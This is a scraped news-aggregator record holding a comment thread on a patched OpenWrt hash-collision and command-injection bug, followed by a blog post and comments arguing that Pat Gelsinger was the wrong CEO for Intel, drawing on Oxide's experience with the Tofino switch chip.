blueflow 4 hours agorootparentI did a mistake. reply ddtaylor 5 hours agorootparentprevFor anyone curious PHP ultimately uses this definition in their introduction portion of the hash extension: > This extension provides functions that can be used for direct or incremental processing of arbitrary length messages using a variety of hashing algorithms, including the generation of HMAC values and key derivations including HKDF and PBKDF2. reply agwa 6 hours agorootparentprevFor example, try running this Go program: https://go.dev/play/p/atvS3j8Dzg- Or see the Botan documentation that explicitly says \"Calling update several times is equivalent to calling it once with all of the arguments concatenated\": https://botan.randombit.net/handbook/api_ref/hash.html I've worked with many cryptography libraries and have never seen an Init-Update-Finalize API that works the way you think it does. It does not protect against canonicalization attacks unless you're using something like TupleHash. reply micw 13 hours agoprevThat's why open source can never compete with business grade closed source stuff: - they fixed the in 3 hours instead of making customers wait 6 months for a patch (if any) - they did not try to sue the reporter of the issue - they did not even tell the users to throw away the \"outdated\" but perfectly working devices, offering a small discount to buy new reply beAbU 10 hours agoparentMaybe make it clear you are being sarcastic here. English is not my native language, and my initial interpretation was that \"they\" in your post referred to the \"business grade closed source stuff\", and that OpenWRT is really a dangerous bet because they are guilty of all the things you listed. reply soulofmischief 9 hours agorootparentTo be fair, that initial confusion is the intended effect of OP's humor. Poe's law and all, but you did figure it out so the joke seems effective. Prefixing or suffixing with sarcasm warnings neuters the joke. reply orra 10 hours agoparentprevWhilst this is true, it looks like OpenWRT fixed the hash truncation but not the command injection. I hope they're planning on fixing the command injection. As the blog post says, the created images are signed. Even without the signing, it's code execution from untrusted user input. And of course vulnerabilities can be strung together (just like in this hash collision case). reply cesarb 6 hours agorootparent> Whilst this is true, it looks like OpenWRT fixed the hash truncation but not the command injection. They did fix both AFAIK, the command injection fix is https://github.com/openwrt/asu/commit/deadda8097d49500260b17... (source: https://openwrt.org/advisory/2024-12-06). reply orra 5 hours agorootparentThanks for the correction and sorry for the mistake. I skimmed the changes but apparently not very well. reply jazz9k 5 hours agoparentprevThis only works for a handful of open source projects with corporate backing and the resources to fix these issues quickly. For most OSS projects, the maintainers are either too overworked or just don't feel like fixing security issues. reply PoignardAzur 8 hours agoparentprevNot gonna lie, you had me in the beginning. reply tapper 11 hours agoparentprevJust why I love OpenWrt. They even ask the people that use screen readers like me to test the web interface to make sure that all is working as it should. reply TiredOfLife 58 minutes agoparentprev>they did not even tell the users to throw away the \"outdated\" but perfectly working devices, offering a small discount to buy new Because they simply brick the device when updating and it's easier, faster, cheaper to buy a new device than to unbrick. reply sweeter 9 hours agoparentprevI have a router that from my ISP I am forced to use that has had a few CVEs ranging from not good to really bad. Most of which are years old. I can get a replacement but it's just the same model. They don't care about security at all and don't care about patching it, even though they have exclusive access rights to the router and can remotely log in to it. It's completely ridiculous. reply retrac 3 hours agorootparentIt's a sad state of affairs, but anyone serious about security ought to consider the common ISP WiFi router to be a potentially hostile device and class it as part of the public side of the Internet. The usual advice is to put a firewall/router of your own running your preferred software, between the ISP device and your network. reply TacticalCoder 8 hours agorootparentprevThe one I use looks scary too. And it came by default with a dumb password too. I wouldn't be surprised if it had a few CVEs hanging too. > I have a router that from my ISP I am forced to use... A friend of mine did impersonate the ISP's router's MAC address and used wireshark to sniff the traffic when the modem started. He then configured the ONT (which is physically inside a SFP plug, it's tiny) to establish the handshake/send the credentials. I don't think the ISP has any idea at all :) reply dml2135 5 hours agorootparentprevWhat forces you to use it? You can’t bring your own router? reply nunez 3 hours agorootparentRouters supplied by AT&T here in the US for their fiber gigabit service do RADIUS authentication with the carrier gateway using certs built into the device. There used to be an older version of this router that had known vulnerabilities which made extracting those certs possible but they've since been patched and those certs have been invalidated. reply surfaceofthesun 1 hour agorootparentNote that you can still downgrade an existing gateway, extract certs[0], then bypass the device [1]. I had to do this with OPNsense to avoid the latency buildup issue, which has been ongoing for months[2]. --- 0 -- https://www.dupuis.xyz/bgw210-700-root-and-certs/ 1 -- https://github.com/MonkWho/pfatt 2 -- https://www.reddit.com/r/ATTFiber/comments/1eqfouo/psa_att_n... reply eightysixfour 3 hours agorootparentprevI believe you can set those to pass through mode and put a router/firewLl behind it without any kind of double NAT. Other than some kind of MITM, you have at least minimized the likelihood of someone using it as an entry point to your network. reply holoduke 12 hours agoparentprevHome assistant and vlc anyone? reply mnau 5 hours agorootparentHa was very user unfriendly when I last tried it ~3 years ago. Yaml was necessary and it required a lot of fiddling to make z-wave work. Each blind was detected as ~5 things (2 useless or no idea what for)... Checking what was position, what power, ect was rather annoying. I made work and something broke about a year later. I just replaced it with off the shelf stuff. reply misiek08 11 hours agoprevFirst - open source tool adjusted to the task it wasn’t made for in short time, only because it is open source and written without BuilderFactoryProvider. (already mentioned so I’m sorry, but it’s killing me every day) Big company would take probably -1 years to fix this, because it would just sue the guy, try to arrest him ASAP and never release patch. OpenWrt after getting information just took the insecure service offline, checked the report (while clients were already safe, because of the shutdown), made patch and released in 3 hours. Wow! reply nrvn 12 hours agoprevLoving this. I wonder how people even come up with an idea of truncating hashes. For what purpose or benefit? reply iforgotpassword 11 hours agoparentTruncated hash functions are not vulnerable to length-extension attacks. But you usually take SHA512 and truncate to 256 bits. Anything shorter than this isn't really considered safe these days. reply ffk 12 hours agoparentprevSometimes it’s done to fit into an existing tool/database that has a preexisting limit. Or when the hash is used only as a locator rather than for integrity. Not a good practice imo but people are pragmatic. reply ajb 10 hours agoparentprevAccording to the commit, they did it to reduce the length of the downloaded filename and URL. reply bflesch 11 hours agoparentprevwhen you upgrade from sha1 to sha256 but you don't want to change your data format for storing the integrity checks / keys. reply epcoa 11 hours agorootparentA SHA-1 is not 12 characters (either in digest bytes or hex nibbles) reply teleforce 12 hours agoprev>I immediately noticed that the length of the hash is truncated to 12, out of 64 characters. Ouch... reply rekttrader 13 hours agoprevKiller write up, very clever bit of code reading and exploit development. reply daghamm 11 hours agoprevFirst of all, nice writeup. I am a bit surprised that so much GPU power was needed to find such short collision but it was nice to see his implementation nevertheless. Regarding the last section, is 40k a reasonable price for one month of security analysis? Does this mean that a good security researcher make about 500k/yr? reply bigiain 11 hours agoparentIt means a good security research company might make $500k for a good researcher, if they could bring in enough work to keep them 100% utilised. Less actually, given paid time off. reply szundi 9 hours agorootparentSick leaves, maternal leave, underutilized for sure (toilet, meetings etc). Just for reference, I have had an audit from PwC and they were skeptical about our 65% time utilization because usually anything above 60% is fake at least partly. LOL, I thought, they were right, we ended up just about 60%. reply lsaferite 5 hours agorootparentprevWhich, if past experience still hold, translates to something more like ~$165/yr + benefits. reply rfoo 10 hours agoparentprev> so much GPU power was needed In post-LLM age one hour of compute on a 4090 is closer to \"so less\" than \"so much\". You can have that for less than $1. reply Bluecobra 11 hours agoparentprevThat seems very reasonable to me. It seems like the pentest companies I have worked with in the past charge that much and just do a lazy nmap/metasploit scan and wrap it into a nice PDF. reply barbegal 11 hours agoparentprev2^(12*4) is 281,474,976,710,656 possible 12 character strings so seriously impressive that it can look through that many in an hour. reply krige 11 hours agoprevWhat's this about hashcat performance being orders of magnitude different depending on arg order? Is it scanning the argument line for target pattern with every execution? reply internet_points 9 hours agoparentCould it be like a lock pick process where you start from the left and see if you get further or can throw away that guess, so by having the \"choices\" be at the beginning you don't have to make them again and again? (and for whatever reason doesn't/can't cache the prefix)? Or could it be like when counting 100000000000 010000000000 110000000000 001000000000 most of the variation is at the left and you only rarely see changes at the right? Would be interesting to get this answer from from someone who knows hashcat and isn't just pulling answers out of the air like me :) reply hoseja 9 hours agorootparentHashing is specifically done to prevent just this. (Just reacting to the comment here, haven't grokked the specifics.) reply srmatto 2 hours agoprevOpenWrt is also very difficult to safely upgrade on some devices which I would also consider as a huge downside. I finally gave up and bought an old Dell off eBay and installed OpnSense and am much happier. reply rrr_oh_man 1 hour agoparenthttps://opnsense.org/wp-content/uploads/2024/07/OPNsense%C2%... That looks so goofy reply srmatto 1 hour agorootparentSure does, but I don't evaluate firewalls based on the quality of their marketing materials. reply ssl-3 57 minutes agoparentprevSome devices are hard to upgrade in large part because they were never intended to be used with things like OpenWRT. To that end: While it can be nice that OpenWRT runs on a quirky compact all-in-one MIPS-based consumer router-box (or whatever), the software also runs just fine on used Dells from eBay. reply efitz 13 hours agoprevVery well written and easy to follow description of your attack. reply op00to 3 hours agoprevVery cool article, security researchers are incredibly creative and scary smart. reply djaychela 8 hours agoprevI'm getting an error when I try to view this: Secure Connection Failed An error occurred during a connection to flatt.tech. SSL received a record that exceeded the maximum permissible length. Error code: SSL_ERROR_RX_RECORD_TOO_LONG No-one else? reply misiek08 6 hours agoparentNot even on my company's crappy proxy (not supporting QUIC and having problems with HTTP/2 sometimes). Works, loads rather quickly. reply bell-cot 3 hours agoparentprevWorks for me, no errors, using Firefox. But a quick peek at their Certificate Details shows several dozen Subject Alt Names. That's probably a corner case which your browser's dev's failed to test. reply renewiltord 13 hours agoprevNicely done. Good write up too. I liked the bits about making hashcat do what you wanted. reply chgo1 8 hours agoprevIs there any way to fix the command injection solely in the Makefile? reply jay-barronville 3 hours agoprev [–] That was an excellent report and a really decent technical explanation. Good to see how quickly OpenWrt (one of my favorite open-source projects) fixed and addressed this vulnerability! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A security engineer identified vulnerabilities in OpenWrt's firmware upgrade process, including command injection and SHA-256 hash collision issues.- The vulnerabilities allowed potential attackers to inject commands and create hash collisions, leading to the installation of malicious firmware.- The OpenWrt team promptly addressed and fixed these vulnerabilities, emphasizing the need for strong security in software supply chains."
    ],
    "commentSummary": [
      "A vulnerability in OpenWrt's supply chain enabled targeted code execution without validation, posing a risk of backdoored builds.- The incident underscores the importance of reproducibility and transparency in software builds, similar to practices in Gentoo's ebuild repository.- OpenWrt's swift response highlights the efficiency of open-source projects in addressing security issues compared to closed-source alternatives."
    ],
    "points": 473,
    "commentCount": 73,
    "retryCount": 0,
    "time": 1733718969
  },
  {
    "id": 42361955,
    "title": "Pat Gelsinger was wrong for Intel",
    "originLink": "https://bcantrill.dtrace.org/2024/12/08/why-gelsinger-was-wrong-for-intel/",
    "originBody": "Why Gelsinger was wrong for Intel Dec 8, 2024 By all accounts, Pat Gelsinger is affable, technically sharp, hard-working, and decent. Those who have worked for him praise him as a singularly good manager. In January 2021, when Gelsinger was abruptly named the CEO of Intel, this is more or less all I knew of him — and I found myself urgently needing to learn much more. To understand my urgency, it’s worth rewinding the clock back to late 2019 and the earliest days of Oxide. We knew what we wanted to build, but we had some big (consequential!) decisions to make — first among them our choice of host CPU. Based on what we had seen in AMD Naples and Rome, we felt that AMD was clearly outpacing Intel, but this was a big bet and we wanted to be rigorous about it. Even though we felt Xeon was unlikely to be our direction, we scheduled a meeting with Intel in Santa Clara (pre-COVID!) to understand their roadmap. We wanted to take advantage of the all-day meeting to understand the other components that Intel was making that might be relevant for us, so we also asked for roadmap briefings on NIC silicon (Columbiaville) and switching silicon (Tofino). The host CPU discussion ended up confirming our beliefs (befitting our writing-intensive culture at Oxide we wrote up our findings in RFD 12 Host CPU Evaluation), and the NIC discussion similarly was a dead end. The switching silicon discussion, however, was interesting: Tofino was TSMC-fabbed (the only Intel part at the time fabbed outside of Intel) and we found the programmable nature of it via P4 to be really compelling. Up until that point, we had assumed that we would have to use Broadcom, and we weren’t thrilled at the prospects; the idea of having not just an alternative, but one with such a novel approach was hugely appealing. The Tofino team at Intel was enthused by our early interest, proving itself to be very responsive in the weeks that followed as we continued to explore the prospects of building around their Tofino 2. The more we learned, the more we liked! As we got deeper with Tofino, we did, however have a single, substantial reservation: we didn’t trust Intel to not kill it. Intel has a long, long (long!) track record of fostering innovation outside of its mainstay x86 product — and then killing it. Making things more complicated, these untimely deaths are not without ambiguity: the efforts that Intel kills are often early and interesting — but need patience and more iterations to be able to win a broader market. And while the cullings are not always wrong (no amount of patience would have saved the iAPX 432), the biggest mistakes in the last two decades at Intel (namely, its failures in mobile CPUs and discrete GPUs) are a result of discarding a flawed effort entirely rather than learning from it and iterating. Still, we loved the idea of P4 and programmable switch silicon, and we really liked the Tofino team at Intel: we felt our teams had a shared vision for the programmable data center — and they were very accommodating of our desire to build something very different from a commodity switch. So despite our trepidations, we stepped over the desiccated carcass of Red Rock Canyon, and engaged on building a switch with Tofino. And we didn’t (and don’t!) regret it: it was of course brutally hard to build our own switch, but the dividends of programmability were enormous — and thanks to Tofino and P4, we were able to build some important, unique functionality. But by the time Gelsinger became CEO in early 2021, our finished product was still a bit in the future: we knew what we were building, but we were in the thick of building it. It was important for me to understand the incoming CEO, and if possible, to get an audience with Gelsinger to explain what we saw in Tofino (and to understand what his vision was for programmable networking silicon). So — and as I relayed in our recent podcast episode on Intel after Gelsinger — I tried to learn as much as possible about the guy in his own words. This would normally mean binge listening podcasts, talks, interviews, etc. — but in Gelsinger’s case, I hit an early and familiar jackpot: as part of their superlative series, the Computer History Museum had a four-hour oral history with Pat Gelsinger. And in listening to Gelsinger, his affability clearly came across, along with his technical acumen and depth of experience. But something else came across too: an indisputable undercurrent of arrogance. Now, it’s a little hard to be critical, given the context: the whole point of an oral history after all is for people to speak about themselves. Still, these oral histories are most interesting when they take the opportunity to expand on failures, and Gelsinger’s narrative of his time at Intel seemingly just went from strength to strength. Worse, in his own story, the bad things at Intel always seemed to happen when he wasn’t in the room or otherwise over his objections — and the good things always when he was called in to save an effort from failure. I’m sure this retelling has truth to it, but I found it surprising that his narrative about AMD Opteron is of Intel conquering AMD with Nahalem under his leadership — with no mention of Intel’s gross architectural missteps with respect to 64-bit that allowed (and even demanded!) AMD Opteron in the first place. But, fine. Again, it’s an oral history; there’s going to be a Rashomon effect. And so the guy was confident; so what? My feeling of his arrogance was still a bit amorphous when we got to Gelsinger retelling the end of his time at Intel. I was waiting for this, because I knew that Gelsinger had led the charge on Larrabee — and that Larrabee was infamously a wreck. He lamented leaving Intel because he knew that Larrabee would be killed after he departed (which it was), but I was shocked when he said that had Intel \"stayed with it… NVIDIA would be a fourth the size they are today.\" I was washing the dishes as I was listening to this, and it stopped me in my tracks: I turned off the faucet, dried my hands, and backed up the recording. Had I heard correctly?! If one wanted to make this eyewatering claim, it must be loaded with riders and caveats: it must acknowledge that Larrabee itself was an unusable disaster; that NVIDIA had an indisputable lead, even in 2009; that for Intel to dominate NVIDIA it would have required conjuring software expertise and focus with which Intel has famously struggled; that Intel had no pattern for sustained success out of x86. On the one hand, there were enough qualifiers from Gelsinger to soften this claim a little (and at least some passing respect for NVIDIA’s Jenson Huang and Bill Dally), but on the other… yes, he actually claimed that NVIDIA had his departure from Intel to thank for (checks transcript) three quarters of its size. (Which, even in 2019 when the conversation was recorded, amounted to a whopping ~$75B!) I think even the interviewers were a little taken aback, and asked the question directly: \"Do you think that it was in part that you weren’t there to drive [Larrabee] forward that they decided to withdraw from that?\" Gelsinger’s response: \"Yeah, I’ll say that very directly.\" This was beyond mere confidence, and was looking more like a total disregard for one’s own limitations. Another feeling was growing inside me: despite his many positive attributes, Gelsinger was the wrong person for the job. And to be clear, the job in 2021 was to lead a company in crisis, viz. the letter from Third Point that precipitated the firing of Bob Swan. Intel’s strategic mistakes were (in my opinion) symptomatic of an acute cultural problem: the company still carried with it the inherited arrogance from an earlier age. A concrete manifestation of the company’s arrogance is that it didn’t listen: it didn’t listen to its own people (and therefore struggled to correct course even when the rank-and-file knew that the trajectory is wrong) and it didn’t listen to its customers (and therefore built the wrong things for new markets — or missed out on those markets entirely). Intel needed a leader that could confront this cultural problem directly — who could work to undo an accretion of generations of entitlement — but if Gelsinger’s narrative for himself was any indicator, it felt like he would instead be feeding the company’s worst impulses about its own exceptionalism. As Gelsinger returned, I found no reassurance in the company’s narrative, which felt less like the arrival of Winston Wolf, and more like a cherished prince returning home to live out his destiny. The concern that Gelsinger would be reliving his past more than navigating Intel’s future wasn’t exactly put to rest when, shortly after his arrival, Intel launched its cringy-as-hell anti-Apple \"Go PC\" ad campaign. (It tells you everything you need to know that Intel deleted the Go PC ads, but then forgot about Canada.) Fortunately for future historians of corporate dreck, the cringiest of these ads was immortalized when Marques Brownlee and David Imel absolutely ripped it apart. \"Go PC\" was an embodiment of the arrogance that I feared came from the top; how could anyone think that Intel’s biggest problem in 2021 was competing against… the Mac?! They knew that AMD also made x86 parts, right?! The whole campaign frankly felt juvenile, as if they were trying to just deride Apple for their decision to build their own silicon. Much meatier than an ill-advised ad campaign was Gelsinger’s announcement that they would have 5 process nodes in 4 years. This was — and is — an aggressive bet for a company that had an entire process node (10nm) slip for years and then quietly fail to yield but a single product (Cannon Lake). From the perspective of an Intel customer, Intel had never come completely clean about the failing of 10nm (publicly or privately); how could Intel expect outsiders to trust them to learn from their mistakes if it wouldn’t even publicly acknowledge what those mistakes were? I don’t think that that bet was necessarily the wrong bet, but it was indisputably going to be expensive and risky. And this gets to Gelsinger’s first real, unequivocal mistake: he didn’t eliminate Intel’s dividend. Eliminating the dividend would have sent an early message to everyone — shareholders and employees — that the company’s survival was at stake, and it would have helped build the war chest for the battles to come. While I think his dichotomy is a bit reductive, Ben Horowitz’s nomenclature is useful here: Intel needed a wartime CEO — but in maintaining a dividend that it couldn’t afford, Gelsinger was committing the ultimate peacetime act. (I am not alone in this view; Ben Thompson of Stratechery dropped a must-listen episode on Intel in which he cites the paying out of billions of dollars of dividends over Gelsinger’s tenure as an early and serious blunder.) Beyond being merely expensive and risky, the newly-christened Intel Foundry Services (IFS) had another, deeper problem: the culture at Intel didn’t really seem amenable to the level of customer engagement that foundry customers (rightfully) expect. And this was compounded by the trust issue that we at Oxide felt with Intel over Tofino: why would a customer trust their future to something chancy like IFS? Absent the availability of 18A, the only answer that Intel ever seemed to give on this was to wrap itself in the flag: that one should choose IFS solely because the fabs are on US soil. In this regard, it reminds me (ironically?) of a long-ago CPU startup, Transmeta. They had interesting technology, but unable to compete with Intel on absolute performance, they retreated to power efficiency. Transmeta was implicitly relying on the fact that Intel wouldn’t release a lower power part, but Intel promptly turned around and introduced the Pentium-M line — and that was more or less it for Transmeta. Similarly, is Intel assuming that TSMC is unable to build fabs in the US or that the US government wouldn’t see such fabs as addressing geopolitical concerns? If so, it feels like a bad assumption on both fronts. Skepticism of Gelsinger’s plan for Intel aside, we at Oxide anxiously watched Tofino. At Intel, the team itself believed it was safe under Gelsinger, and things did indeed seem okay for a while. Fast-forward two years to 2023, and we got an urgent request for a call from the executive leading the Tofino effort. Fearing the worst, we were honestly somewhat relieved to learn that Tofino hadn’t been killed outright — but all future development of the part had been cancelled. We were on the cusp of shipping our first product, and the switch was working, so our own die was cast. And we were reassured by the Tofino team, who (to their great credit!) assured us that they would support us, even going to far as to draft a formal letter from Intel that we could share with our own customers expressing Intel’s ongoing support of Tofino. While the situation for Tofino was obviously dire, I also felt we had some stoppage time; could we get in front of Gelsinger to explain why killing switching silicon in 2023 feels a lot like walking away from the GPGPU in 2011? No, as it turns out, we couldn’t. (And nor, apparently, could anyone else who was buying the part.) Everyone we dealt with at Intel agreed that the move was short-sighted, but as with so many things Intel (that culture problem again!), they felt powerless to change it. Tofino was clearly living on borrowed time, and we were disappointed (though frankly not that surprised) when we were notified earlier this year that Tofino was being formally killed. It’s a credit to the Tofino team (or what was left of it at that point) that they continued to be very direct with us; this was (clearly) a decision that they disagreed with, and they were especially apologetic for the sloppy manner in which the end-of-life was being handled (which made a mockery of Intel’s own process for end-of-life management). In the end, for all of the decisions that we made at Oxide — out of all of the companies and parts that we bet on, out of all the partners that we had sent RFD 68 Partnership as Shared Values to — only one had walked away from us, and it was the largest and best capitalized partner, who had repeatedly told us that they would not do exactly what they in fact did. How can Intel ever expected to be trusted when they treat partners this way? For Oxide, fortunately, Intel might have done us a favor in the limit. While we were grateful to Tofino for allowing us to prove out our ideas on programmable networking, we had issues with it too. Specifically, Tofino’s software and instruction set architecture remained needlessly proprietary. We believe that switching silicon is awaiting its \"x86 moment\", when open source software can be implemented for a well-defined ISA — and we were never going to get there with Tofino. As we looked for our post-Tofino future, we were delighted to find the Xsight Labs team and their X2 ASIC. We are going to have a lot more to say about this part, but suffice it to say that we see in X2 both the strengths that we saw in Tofino and also the potential to be the open substrate for programmable networking writ large. Stay tuned! I have great reverence for Intel and its extraordinary history, and I would never count them out (the resurrection of a clinically-dead AMD shows what is possible!), but I also won’t be integrating with any of their technology until their acute cultural issues are addressed. With regard to these cultural issues (and his other strengths aside), Pat Gelsinger was indisputably wrong for Intel.",
    "commentLink": "https://news.ycombinator.com/item?id=42361955",
    "commentBody": "Pat Gelsinger was wrong for Intel (dtrace.org)405 points by hasheddan 18 hours agohidepastfavorite323 comments CodeHorizon 16 hours agoBring back Pat. Was Pat perfect, no. But Pat acknowledged Intel’s problems - something Otellini, Krzanich, and Swan never did. These CEOs, all non-technical, focused on dividends, buybacks, and next-quarter results while Intel fell behind in advanced nodes and innovation. Gelsinger inherited a disaster: 10nm delays, TSMC pulling ahead, and no GPU strategy. He had the courage to cut buybacks and slashed dividends. He poured billions into fabs in Arizona, Ohio, Germany, and Ireland. He delivered Intel 18A, powered on first silicon, released PDK 1.0 for Microsoft, and secured Microsoft and Amazon as customers. There were even rumors Apple might join. Contrast this with Nadella at Microsoft back in 2014. He didn’t reboot the company by tearing everything down. Instead, he built on Ballmer-era wins like Azure, Office 365 while shifting Microsoft’s focus to the cloud. Gelsinger had to start from scratch in many ways, tackling years of neglect while facing harsher challenges. Yes, Intel’s stock dropped $150 billion, but Gelsinger was upfront - it wouldn’t turn around before 2025. He was trained by Gordon Moore and Andy Grove, and while some saw him as arrogant, that confidence came from decades of technical leadership. The real issue? The board. Full of people like Boeing execs. They don’t get engineering. Trusting them to fix Intel is like hoping a plane door won’t pop open mid-flight. They’re the ones who should be replaced. reply GuB-42 15 hours agoparent> The real issue? The board. Full of people like Boeing execs. Literally, Gregory Smith, former Boeing CFO is a member of the board. reply wcunning 13 hours agorootparentFrom Fabricated Knowledge[0]: \"Meet Greg. He’s the former CFO and EVP of operations at Boeing. He’s been on the board since 2017 and was an interim CEO at Boeing during 2020. He also sits on the American Airlines board and is Chairman there. He sits on the Sierra Nevada Space Corporation board as well. He has almost no semiconductor experience and could probably be directly involved with the Boeing fiasco. He’s been on the board for the entire Intel disaster and, at one point, was interim CEO of Boeing, so he's likely not the most focused member.\" [0] - https://open.substack.com/pub/mule/p/the-death-of-intel-when... reply lotsofpulp 14 hours agorootparentprevThe issue then moves up to why do Intel stock owners keep voting for the same garbage board members, even after 20 years of no innovation? reply branko_d 13 hours agorootparent\"Most large investors vote alongside Glass Lewis and ISS recommendations, the two most prominent proxy solutions for investors. Most GL/ISS recommendations tend to vote with the board and don’t change much unless something drastic happens. If you’re a passive investor, you vote in line with the two proxy powerhouses.\" - The Death of Intel: When Boards Fail https://www.fabricatedknowledge.com/p/the-death-of-intel-whe... reply Dalewyn 11 hours agorootparent>If you’re a passive investor, you vote in line with the two proxy powerhouses. As a passive investor in SWPPX, an S&P 500 index mutual fund from Charles Schwab, \"my\" Intel stock votes are whatever Charles Schwab deems appropriate. reply highwaylights 11 hours agorootparentThis is the correct answer. People still don't realise just how much power over virtually every public company in America (and therefore the economy) is concentrated in the hands of a handful of people at Vanguard you've never heard of, for example. reply DebtDeflation 7 hours agorootparentFor those who may not be aware of what you are talking about: 3 fund companies (BlackRock, State Street, Vanguard) are the largest shareholder in over 80% of SP500 companies and collectively own around 28% of the SP500 market cap. reply Cumpiler69 7 hours agorootparentDoesn't that level of influence over large parts of the economy make those enterprises a bit dangerous? Also, how did Blackrock get so wealthy so fast? They've only been around since 1988. reply derf_ 6 hours agorootparent> Also, how did Blackrock get so wealthy so fast? They've only been around since 1988. It is not their money. They have roughly $11.5 trillion of assets under management, but their market cap is only $161.5b (on net income of about $6b). Compare that to xAI, which has existed for less than two years and has a valuation around $50b. reply corford 6 hours agorootparentprevPassive flows vis ETFs have hugely distorted the S&P. Mike Green has been sounding the alarm about this for quite some time (https://x.com/profplum99, https://www.yesigiveafig.com/). reply trogdor 2 hours agorootparentI am interested in learning about what you are referring to, but you linked his entire Substack and Twitter account. Would you please link a specific post? reply markus_zhang 2 hours agorootparentprevThey own the country bro. They are (part of) the country. We are the tenants. reply sofixa 7 hours agorootparentprevYes. If they collectively decide stock price matters more than anything else (sustainability, the planet, long term viability of the business), they get it, whatever the short or long term costs. There was a comparison between Amundi (France based) and BlackRock, and their voting patterns, and BlackRock was consistently voting against any ESG or in any way ecology related proposals. Anything that isn't directly about making more money is just not their thing. Contrast that with Amundi who overwhelmingly voted for ESG or similar measures. reply throwaway48476 7 hours agorootparentElectronic trading and passive investing drove commissions to zero so Blackrock helped create ESG because ESG requires paying commission for the service of certifying an investment as ESG. reply Cumpiler69 7 hours agorootparentprev>If they collectively decide stock price matters more than anything else So an oligopoly that presents the illusion of free market? reply hnfong 1 hour agorootparentMatt Levine has recently written a humorous-yet-thorough article on this exact issue: https://www.bloomberg.com/opinion/articles/2024-12-02/texas-... reply throwaway48476 6 hours agorootparentprevA market has buyers and sellers. Corporate decisions are driven by politcs where market terms don't apply. reply fireflash38 7 hours agorootparentprevIt's been a concern that I've had for a bit - if everyone recommends index funds, then you lose a lot of the underlying \"value\" behind them. You have fewer people making decisions about what stocks to buy. You get this really top heavy system. reply lotsofpulp 5 hours agorootparentBroad market index funds are the inflation protected asset due to US federal government bailout. Your savings account is not going to keep up with inflation, nor are TIPS or US treasuries (not for land/healthcare/education), but an SP500 fund will do a better job over the course of decades. reply Dalewyn 5 hours agorootparentTIPS are literally designed to track inflation, Treasury I-Bonds are also designed to track and surpass inflation. The US total stock market (ex-US stock market is a crapshoot) and its subset the S&P 500 index will generally do a better job than any bonds given a long enough timeframe, but that doesn't mean appropriate bonds can't do the job either. reply lotsofpulp 4 hours agorootparentThat is why I specified land/healthcare/education. I guess I should have specified that it matters more for metropolitan areas, especially high cost of living regions. TIPS won’t come close to making one be able to compete with other buyers in those markets for the non mass produced/imported resources. If someone invested their money in TIPS over the last 30 or 40 years thinking they will be able to buy real estate because TIPS protected them from inflation, they would have been sorely disappointed for pretty much all non Midwest/interior northeast metros. This is a demographic/political issue for all developed countries, they must reduce the purchasing power of their currency as a tax to be able to deliver the benefits expected by the more populous, older voting populace. reply ac29 2 hours agorootparent> If someone invested their money in TIPS over the last 30 or 40 years thinking they will be able to buy real estate because TIPS protected them from inflation TIPS have been available less than 30 years. reply lotsofpulp 1 hour agorootparentDoes that change the reality that a 1997 30 year TIPS would have been ineffective at helping purchase what was once a below $100 per square foot home in 1997 that is now $300+ per square foot in most US population centers? Replace home price change (or land price change) with education price change or healthcare price change. Probably even trades’ worker price change. If a nursing home cost $x per month in 1997, and you thought putting away an equivalent amount of cash in TIPS will ensure you can afford a nursing home in 2027 or 2037, it’s probably not going to be fun to find out how much they cost now. It worked great if you wanted to ensure being able to buy electronics, other manufactured goods, and probably groceries. But those are beneficiaries of automation and foreign labor. reply Dalewyn 7 hours agorootparentprevIt's not like most of the people making those decisions are doing any better than just throwing dice at a wall and seeing what sticks. In the immortal words of Warren Buffett and Jack Bogle respectively: \"The stock market is a device for transferring money from the impatient to the patient.\" and \"The daily machinations of the stock market are like a tale told by an idiot, full of sound and fury, signifying nothing.\" You can either gamble and blame yourself or ride the market (invest in index funds) and excuse yourself from losses. If you're just interested in making some money using some disposable cash, it makes even more sense to just ride the market. reply imglorp 6 hours agorootparentprevOk fair enough. But please explain like you might to a child, since these fund managers are exercising their power and since they are picking short term focused, parasitic, extractive boards like the Boeing/Intel ones, what impact are they trying to have on their funds? What fruit will the Vanguard 3030 fund reap when Intel and Boeing tank, say, maybe this year? reply parsimo2010 6 hours agorootparentA fund manager can throw their weight behind short term gains, and when those gains dry up they can sell their Intel stake and put it in the next company to be sucked dry. They don’t have to care about long term success. reply lotsofpulp 56 minutes agorootparentYou glossed over the hard part. You have to sell before the “gains dry up”, otherwise you won’t have much money to invest in a new company to have enough of a voice to suck it dry. But for an index fund, there is no fund manager choosing when and if to sell. The investors of the fund are just following the markets, not really earning a lot (in real terms), but also not losing much. reply Dalewyn 5 hours agorootparentprevFund managers are obligated to act according to their fund's prospectus[1], of which the specifics will vary with each fund. For a TDF (Target Date Fund), because that was brought up (Vanguard 2030): Both actively and passively managed ones must generally be managed such that shareholders can start withdrawing adequate funds (selling shares) upon and after reaching the \"target date\". For an S&P 500 index fund like the one I mentioned and hold (SWPPX), the fund manager is required to imitate the actual S&P 500 index as much as reasonably possible. In short, \"don't have to care about long term success\" is not a generally usable argument for fund management. [1]: https://www.investopedia.com/terms/p/prospectus.asp reply parsimo2010 2 hours agorootparentIf the prospectus says \"follow the S&P 500\" the fund manager is also not interested in long term success, they are interested in tracking the index. But the fund managers tracking an index are not the main problem, they are just putting a lot of passive votes behind the funds that are actively working on electing board members in the interest of short term growth/profit (which brings more people to invest in their funds and gets them big bonuses). reply throwaway48476 7 hours agorootparentprevPeople in the ESG space are stating to notice. Incompetent suits is an even bigger problem though. reply leftyspook 13 hours agorootparentprevAs if the stock owners have any more engineering knowledge. They are sewn from the same exact MBA cloth. reply UberFly 12 hours agorootparentGawd this comment gets to the heart of so many problems. reply noipv4 12 hours agorootparentSign of times; we have trained millions of MBA monkeys and they have infiltrated everywhere. just see what a cesspool linkedin is. reply ErigmolCt 11 hours agorootparentAnd we might see more organizations prioritizing substance over spreadsheets reply michaelt 8 hours agorootparentprevThe way modern stock ownership is structured makes it almost impossible for shareholders to exercise any meaningful control. Shareholders have no access to insider, commercially confidential information - so shareholders don't get to change the captain until after the ship's hit the iceberg. If I have shares in a video game company and the inept boss didn't organise enough testing so the game's got loads of major bugs? Well, I only find out after the damage is done. Is Gelsinger fucking up the delivery of 18A? I have no idea! Meanwhile, individual shareholders' power is incredibly diffuse. The smart investor has a diversified portfolio, and even if I've literally got a million dollars invested in Intel, I still only own 0.0011% of the company. Maybe I should coordinate with the other investors, you say? Get together with 1000 other similar investors, and we've got 1% between us? It's impossible, because they're all 